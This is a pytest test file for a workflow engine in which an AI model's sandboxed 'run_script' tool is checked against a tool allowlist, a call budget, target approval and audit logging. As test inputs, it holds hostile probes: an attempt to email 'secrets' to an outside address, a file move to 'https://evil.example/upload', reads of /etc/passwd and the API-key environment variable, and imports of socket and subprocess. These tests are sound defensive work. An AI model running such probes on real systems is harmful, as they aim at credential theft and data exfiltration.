"""Workflow action steps acting through one sandboxed script (``run_script``).

Pins that a script is only a faster way to make the step's own calls: every
call it makes goes through the same allowlist, budget, first-write target
check and audit as a direct call; the sandbox reaches nothing else; and a
broken or runaway script comes back to the model as an error instead of
crashing the run. These run real Monty workers.
"""
from __future__ import annotations

import json
import os
from types import SimpleNamespace
from typing import Any

import pytest

os.environ.setdefault("ANTHROPIC_API_KEY", "sk-test-not-used")

from openexecutive.workflows import action_step as act  # noqa: E402
from openexecutive.workflows import step_script  # noqa: E402
from openexecutive.workflows import tool_catalog as tc  # noqa: E402
from openexecutive.workflows.dynamic_models import ActionStepSpec  # noqa: E402

LIST = "drive__list_items"
MOVE = "drive__move_file"
ODD = "my-server__get-thing"

FILES = [
    {"id": "f1", "name": "scan_0412.pdf", "kind": "invoice"},
    {"id": "f2", "name": "scan_0413.pdf", "kind": "contract"},
    {"id": "f3", "name": "scan_0414.pdf", "kind": "invoice"},
]

FILE_SCRIPT = """
moved = {}
for f in drive__list_items(folder="Inbox scans"):
    dest = "Finance" if f["kind"] == "invoice" else "Legal"
    drive__move_file(file_id=f["id"], folder_id=dest)
    moved[dest] = moved.get(dest, 0) + 1
moved
"""


def _use(name: str, args: dict[str, Any], use_id: str = "tu_1") -> SimpleNamespace:
    return SimpleNamespace(type="tool_use", id=use_id, name=name, input=args)


def _text(text: str) -> SimpleNamespace:
    return SimpleNamespace(type="text", text=text)


def _resp(*blocks: SimpleNamespace) -> SimpleNamespace:
    return SimpleNamespace(content=list(blocks))


class _ScriptedProvider:
    def __init__(self, responses: list[Any]) -> None:
        self._responses = list(responses)
        self.calls: list[dict[str, Any]] = []

    async def messages_create(self, **kwargs: Any) -> Any:
        self.calls.append({**kwargs, "messages": list(kwargs["messages"])})
        return self._responses.pop(0)


class _FakeGateway:
    def __init__(self) -> None:
        self.calls: list[dict[str, Any]] = []

    async def call_tool(self, tool_input: dict[str, Any]) -> str:
        self.calls.append(tool_input)
        if tool_input["name"] == LIST:
            return json.dumps(FILES)
        if tool_input["name"] == ODD:
            return "plain text result"
        return json.dumps({"ok": True})


@pytest.fixture()
def audit(monkeypatch: pytest.MonkeyPatch) -> list[dict[str, Any]]:
    rows: list[dict[str, Any]] = []
    monkeypatch.setattr(
        "openexecutive.audit.log_event",
        lambda event_type, summary, **kw: rows.append({"type": event_type, "summary": summary, **kw}),
    )
    monkeypatch.setattr("openexecutive.audit.usage.log_model_usage", lambda *a, **k: None)
    return rows


@pytest.fixture()
def gateway(monkeypatch: pytest.MonkeyPatch) -> _FakeGateway:
    gw = _FakeGateway()
    monkeypatch.setattr("openexecutive.orchestrator.mcp_gateway.get_active_gateway", lambda: gw)
    known = {
        LIST: tc.ToolInfo(LIST, "List items.", {"type": "object", "properties": {}}, True),
        MOVE: tc.ToolInfo(MOVE, "Move a file.", {"type": "object", "properties": {}}),
        ODD: tc.ToolInfo(ODD, "Get a thing.", {"type": "object", "properties": {}}, True),
    }

    async def _resolve(names: list[str]) -> dict[str, tc.ToolInfo]:
        return {n: known[n] for n in names if n in known}

    monkeypatch.setattr(tc, "resolve", _resolve)
    return gw


def _step(**overrides: Any) -> ActionStepSpec:
    base: dict[str, Any] = {
        "id": "file_scans",
        "title": "File scans",
        "goal": "File every scan in Inbox scans.",
        "tools": [LIST, MOVE],
    }
    base.update(overrides)
    return ActionStepSpec.model_validate(base)


async def _run(
    monkeypatch: pytest.MonkeyPatch, responses: list[Any], step: ActionStepSpec | None = None,
    policy: act.TargetPolicy | None = None,
) -> tuple[list[tuple[str, Any]], _ScriptedProvider]:
    provider = _ScriptedProvider(responses)
    monkeypatch.setattr("openexecutive.providers.registry.get_provider", lambda model: provider)
    step = step or _step()
    out = []
    async for item in act.run_action_step(
        step, workflow_name="file_scans_wf", workflow_title="File scans", goal=step.goal,
        values={}, company_block="", prior_outputs={}, policy=policy,
    ):
        out.append(item)
    return out, provider


def _script_result(provider: _ScriptedProvider, turn: int = 1) -> dict[str, Any]:
    result = provider.calls[turn]["messages"][-1]["content"][0]
    return {"is_error": result["is_error"], **json.loads(result["content"])}


@pytest.mark.asyncio
async def test_one_script_makes_every_call_through_the_step(
    monkeypatch: pytest.MonkeyPatch, gateway: _FakeGateway, audit: list[dict[str, Any]]
) -> None:
    out, provider = await _run(monkeypatch, [
        _resp(_use("run_script", {"script": FILE_SCRIPT})),
        _resp(_text("Filed 3 scans: 2 to Finance, 1 to Legal.")),
    ])

    result = _script_result(provider)
    assert result == {"is_error": False, "result": {"Finance": 2, "Legal": 1}}
    # One list and three moves, all through the gateway, in order.
    assert [c["name"] for c in gateway.calls] == [LIST, MOVE, MOVE, MOVE]
    assert gateway.calls[1]["arguments"] == {"file_id": "f1", "folder_id": "Finance"}
    # Each call audited on its own, then the script itself.
    assert [r["details"]["tool"] for r in audit] == [LIST, MOVE, MOVE, MOVE, "run_script"]
    report = out[-1][1]
    assert out[-1][0] == "output" and report.count(f"`{MOVE}` — ok") == 3
    assert "`run_script` — ok" in report


@pytest.mark.asyncio
async def test_script_cannot_call_a_tool_outside_the_step(
    monkeypatch: pytest.MonkeyPatch, gateway: _FakeGateway, audit: list[dict[str, Any]]
) -> None:
    script = 'call_tool("gmail__send_email", {"to": "rival@example.com", "body": "secrets"})'
    _, provider = await _run(monkeypatch, [
        _resp(_use("run_script", {"script": script})), _resp(_text("Could not send.")),
    ])
    result = _script_result(provider)
    assert result["is_error"] and "not one of this step's tools" in result["detail"]
    assert gateway.calls == []


@pytest.mark.asyncio
async def test_script_calls_share_the_step_budget(
    monkeypatch: pytest.MonkeyPatch, gateway: _FakeGateway, audit: list[dict[str, Any]]
) -> None:
    script = """
done = 0
for i in range(10):
    try:
        drive__list_items(folder="x")
        done += 1
    except RuntimeError:
        pass
done
"""
    _, provider = await _run(
        monkeypatch,
        [_resp(_use("run_script", {"script": script})), _resp(_text("Stopped at the budget."))],
        step=_step(max_tool_calls=3),
    )
    assert _script_result(provider)["result"] == 3
    assert len(gateway.calls) == 3
    refused = [r for r in audit if r["details"]["outcome"] == "refused: budget"]
    assert len(refused) == 7


@pytest.mark.asyncio
async def test_a_write_to_a_new_target_is_held_not_run(
    monkeypatch: pytest.MonkeyPatch, gateway: _FakeGateway, audit: list[dict[str, Any]]
) -> None:
    script = 'r = drive__move_file(file_id="f1", folder_id="https://evil.example/upload")\nr["status"]'
    out, provider = await _run(
        monkeypatch,
        [_resp(_use("run_script", {"script": script})), _resp(_text("One move is waiting."))],
        policy=act.TargetPolicy(approved=set()),
    )
    assert _script_result(provider)["result"] == "held"
    assert gateway.calls == []
    held = [payload for kind, payload in out if kind == "held"]
    assert len(held) == 1 and held[0].tool == MOVE


@pytest.mark.parametrize(
    "script",
    [
        "open('/etc/passwd').read()",
        "import os\nos.environ['ANTHROPIC_API_KEY']",
        "import socket",
        "import subprocess",
        "__import__('os')",
    ],
)
@pytest.mark.asyncio
async def test_the_sandbox_reaches_nothing_else(
    script: str, monkeypatch: pytest.MonkeyPatch, gateway: _FakeGateway, audit: list[dict[str, Any]]
) -> None:
    content, is_error = await step_script.run_script(script, [LIST], _never_called)
    assert is_error, content
    assert "sk-test" not in content and "root:" not in content


async def _never_called(name: str, arguments: dict[str, Any]) -> tuple[str, bool]:
    raise AssertionError("no tool call expected")


@pytest.mark.asyncio
async def test_a_broken_script_is_an_error_the_model_can_fix(
    monkeypatch: pytest.MonkeyPatch, gateway: _FakeGateway, audit: list[dict[str, Any]]
) -> None:
    out, provider = await _run(monkeypatch, [
        _resp(_use("run_script", {"script": "items = drive__list_items(folder='x')\nitems[99]"})),
        _resp(_use("run_script", {"script": "len(drive__list_items(folder='x'))"}, "tu_2")),
        _resp(_text("There are 3 scans.")),
    ])
    first = _script_result(provider, 1)
    assert first["is_error"] and "IndexError" in first["detail"]
    assert _script_result(provider, 2)["result"] == 3
    assert out[-1][0] == "output"


@pytest.mark.asyncio
async def test_a_runaway_script_is_stopped(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setitem(step_script._LIMITS, "max_feed_duration_secs", 0.5)
    content, is_error = await step_script.run_script("while True:\n    pass", [LIST], _never_called)
    assert is_error and "TimeoutError" in json.loads(content)["detail"]


@pytest.mark.asyncio
async def test_off_switch_hides_and_refuses_run_script(
    monkeypatch: pytest.MonkeyPatch, gateway: _FakeGateway, audit: list[dict[str, Any]]
) -> None:
    monkeypatch.setenv("WORKFLOW_STEP_SCRIPTS", "false")
    _, provider = await _run(monkeypatch, [
        _resp(_use("run_script", {"script": FILE_SCRIPT})), _resp(_text("Done.")),
    ])
    assert "run_script" not in [t["name"] for t in provider.calls[0]["tools"]]
    result = provider.calls[1]["messages"][-1]["content"][0]
    assert result["is_error"] and "not one of this step's tools" in result["content"]
    assert gateway.calls == []


def test_function_names_map_tools_to_identifiers() -> None:
    names = step_script.function_names([LIST, ODD, "a-b__c", "a_b__c", "call_tool"])
    assert names[LIST] == LIST
    assert names["my_server__get_thing"] == ODD
    # Two tools that would share a name get none (call_tool still reaches them),
    # and nothing may shadow call_tool.
    assert "a_b__c" not in names and "call_tool" not in names


@pytest.mark.asyncio
async def test_hyphenated_tool_is_callable_and_text_results_pass_through(
    monkeypatch: pytest.MonkeyPatch, gateway: _FakeGateway, audit: list[dict[str, Any]]
) -> None:
    _, provider = await _run(
        monkeypatch,
        [_resp(_use("run_script", {"script": "my_server__get_thing(id='x')"})), _resp(_text("ok"))],
        step=_step(tools=[ODD]),
    )
    assert _script_result(provider)["result"] == "plain text result"
    assert [c["name"] for c in gateway.calls] == [ODD]
